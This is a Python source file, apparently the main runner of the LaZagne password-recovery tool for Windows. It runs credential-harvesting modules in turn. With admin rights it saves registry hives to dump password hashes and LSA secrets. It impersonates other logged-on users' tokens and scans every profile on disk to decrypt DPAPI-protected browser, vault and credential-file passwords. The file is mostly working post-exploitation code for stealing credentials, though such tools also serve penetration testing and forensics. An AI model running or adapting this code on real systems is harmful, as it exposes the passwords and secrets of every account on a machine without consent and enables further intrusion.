# -*- coding: utf-8 -*-
# !/usr/bin/python
import ctypes
import logging
import sys
import traceback

from lazagne.config.change_privileges import list_sids, rev2self, impersonate_sid_long_handle
from lazagne.config.users import get_user_list_on_filesystem, set_env_variables, get_username_winapi
from lazagne.config.dpapi_structure import SystemDpapi, are_masterkeys_retrieved
from lazagne.config.execute_cmd import save_hives, delete_hives
from lazagne.config.write_output import print_debug, StandardOutput
from lazagne.config.constant import constant
from lazagne.config.manage_modules import get_categories, get_modules

# Useful for the Pupy project
# workaround to this error: RuntimeError: maximum recursion depth exceeded while calling a Python object
sys.setrecursionlimit(10000)


def create_module_dic():
    if constant.modules_dic:
        return constant.modules_dic
    
    modules = {}

    # Define a dictionary for all modules
    for category in get_categories():
        modules[category] = {}

    # Add all modules to the dictionary
    for m in get_modules():
        modules[m.category][m.options['dest']] = m

    constant.modules_dic = modules
    return modules


def run_module(title, module):
    """
    Run only one module
    """
    try:
        constant.st.title_info(title.capitalize())  # print title
        pwd_found = module.run()  # run the module
        constant.st.print_output(title.capitalize(), pwd_found)  # print the results

        # Return value - not used but needed
        yield True, title.capitalize(), pwd_found
    except Exception:
        error_message = traceback.format_exc()
        print_debug('DEBUG', error_message)
        yield False, title.capitalize(), error_message


def run_modules(module, subcategories={}, system_module=False):
    """
    Run modules inside a category (could be one or multiple modules)
    """
    modules_to_launch = []
    
    # Launch only a specific module
    for i in subcategories:
        if subcategories[i] and i in module:
            modules_to_launch.append(i)

    # Launch all modules
    if not modules_to_launch:
        modules_to_launch = module

    for i in modules_to_launch:
        # Only current user could access to HKCU registry or use some API that only can be run from the user environment
        if not constant.is_current_user:
            if module[i].registry_used or module[i].only_from_current_user:
                continue

        if system_module ^ module[i].system_module:
            continue

        if module[i].winapi_used:
            constant.module_to_exec_at_end['winapi'].append({
                'title': i,
                'module': module[i],
            })
            continue

        if module[i].dpapi_used:
            constant.module_to_exec_at_end['dpapi'].append({
                'title': i,
                'module': module[i],
            })
            continue

        # Run module
        for m in run_module(title=i, module=module[i]):
            yield m


def run_category(category_selected, subcategories={}, system_module=False):
    constant.module_to_exec_at_end = {
        "winapi": [],
        "dpapi": [],
    }
    modules = create_module_dic()
    categories = [category_selected] if category_selected != 'all' else get_categories()
    for category in categories:
        for r in run_modules(modules[category], subcategories, system_module):
            yield r

    if not system_module:
        if constant.is_current_user:
            # Modules using Windows API (CryptUnprotectData) can be called from the current session
            for module in constant.module_to_exec_at_end.get('winapi', []):
                for m in run_module(title=module['title'], module=module['module']):
                    yield m

            if constant.module_to_exec_at_end.get('dpapi', []):
                if are_masterkeys_retrieved():
                    for module in constant.module_to_exec_at_end.get('dpapi', []):
                        for m in run_module(title=module['title'], module=module['module']):
                            yield m
        else:
            if constant.module_to_exec_at_end.get('dpapi', []) or constant.module_to_exec_at_end.get('winapi', []):
                if are_masterkeys_retrieved():
                    # Execute winapi/dpapi modules - winapi decrypt blob using dpapi without calling CryptUnprotectData
                    for i in ['winapi', 'dpapi']:
                        for module in constant.module_to_exec_at_end.get(i, []):
                            for m in run_module(title=module['title'], module=module['module']):
                                yield m


def run_lazagne(category_selected='all', subcategories={}, password=None):
    """
    Execution Workflow:
    - If admin:
        - Execute system modules to retrieve LSA Secrets and user passwords if possible
            - These secret could be useful for further decryption (e.g Wifi)
        - If a process of another user is launched try to impersone it (impersonating his token)
            - TO DO: if hashdump retrieved other local account, launch a new process using psexec techniques 
    - From our user:
        - Retrieve all passwords using their own password storage algorithm (Firefox, Pidgin, etc.)
        - Retrieve all passwords using Windows API - CryptUnprotectData (Chrome, etc.)
        - If the user password or the dpapi hash is found:
            - Retrieve all passowrds from an encrypted blob (Credentials files, Vaults, etc.)
    - From all users found on the filesystem (e.g C:\\Users) - Need admin privilege:
        - Retrieve all passwords using their own password storage algorithm (Firefox, Pidgin, etc.)
        - If the user password or the dpapi hash is found:
            - Retrieve all passowrds from an encrypted blob (Chrome, Credentials files, Vaults, etc.)

    To resume:
    - Some passwords (e.g Firefox) could be retrieved from any other user
    - CryptUnprotectData can be called only from our current session
    - DPAPI Blob can decrypted only if we have the password or the hash of the user
    """

    # Useful if this function is called from another tool
    if password:
        constant.user_password = password

    if not constant.st:
        constant.st = StandardOutput()

    # --------- Execute System modules ---------
    if ctypes.windll.shell32.IsUserAnAdmin() != 0:
        if save_hives():
            # System modules (hashdump, lsa secrets, etc.)
            constant.username = 'SYSTEM'
            constant.finalResults = {'User': constant.username}
            constant.system_dpapi = SystemDpapi()

            if logging.getLogger().isEnabledFor(logging.INFO):
                constant.st.print_user(constant.username)
            yield 'User', constant.username

            try:
                for r in run_category(category_selected, subcategories, system_module=True):
                    yield r
            except:  # Catch all kind of exceptions
                pass
            finally:
                delete_hives()

            constant.stdout_result.append(constant.finalResults)

    # ------ Part used for user impersonation ------

    constant.is_current_user = True
    constant.username = get_username_winapi()
    if not constant.username.endswith('$'):
        
        constant.finalResults = {'User': constant.username}
        constant.st.print_user(constant.username)
        yield 'User', constant.username

        set_env_variables(user=constant.username)

        for r in run_category(category_selected, subcategories):
            yield r
        constant.stdout_result.append(constant.finalResults)
    
    # Check if admin to impersonate
    if ctypes.windll.shell32.IsUserAnAdmin() != 0:

        # --------- Impersonation using tokens ---------

        sids = list_sids()
        impersonate_users = {}
        impersonated_user = [constant.username]

        for sid in sids:
            # Not save the current user's SIDs and not impersonate system user
            if constant.username != sid[3] and sid[2] != 'S-1-5-18':
                impersonate_users.setdefault(sid[3], []).append(sid[2])

        for user in impersonate_users:
            if 'service' in user.lower().strip():
                continue

            # Do not impersonate the same user twice
            if user in impersonated_user:
                continue

            constant.st.print_user(user)
            yield 'User', user

            constant.finalResults = {'User': user}
            for sid in impersonate_users[user]:
                try:
                    set_env_variables(user, to_impersonate=True)
                    if impersonate_sid_long_handle(sid, close=False):
                        impersonated_user.append(user)

                        # Launch module wanted
                        for r in run_category(category_selected, subcategories):
                            yield r

                        rev2self()
                        constant.stdout_result.append(constant.finalResults)
                        break
                except Exception:
                    print_debug('DEBUG', traceback.format_exc())

        # --------- Impersonation browsing file system ---------

        constant.is_current_user = False
        # Ready to check for all users remaining
        all_users = get_user_list_on_filesystem(impersonated_user=[constant.username])
        for user in all_users:
            # Fix value by default for user environment (APPDATA and USERPROFILE)
            set_env_variables(user, to_impersonate=True)
            constant.st.print_user(user)

            constant.username = user
            constant.finalResults = {'User': user}
            yield 'User', user

            # Retrieve passwords that need high privileges
            for r in run_category(category_selected, subcategories):
                yield r

            constant.stdout_result.append(constant.finalResults)
